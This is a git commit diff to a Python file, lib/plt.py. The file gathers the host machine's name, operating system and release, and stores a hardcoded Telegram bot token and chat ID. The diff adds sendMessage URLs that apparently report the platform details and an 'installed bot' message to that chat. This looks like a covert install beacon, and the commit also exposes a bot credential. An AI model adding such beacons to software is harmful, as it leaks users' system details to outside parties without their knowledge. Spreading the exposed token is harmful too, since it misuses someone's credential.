7b0e7dada74e8ae799acf12e78e9e5d9ec42754e
z0roday <100026917+z0roday@users.noreply.github.com>
2024-09-19 09:13:28 -0700

    update plt.py

--- lib/plt.py
+++ lib/plt.py
@@ -2,6 +2,7 @@ from platform import node , system , release
 
 node , system , release = node(), system(), release()
 
+
 user = "@z0roday"
 
 git = "https://github.com/z0roday"
@@ -29,3 +30,8 @@ response = "res 200 successfully installed bot"
 tkn = "7330729864:AAE1QK7hCAEFmtrpaXd9ZjMObzO864uqSo4"
 
 zdy = 6157703844
+
+
+api = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={plat}"
+
+api2 = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={response}"
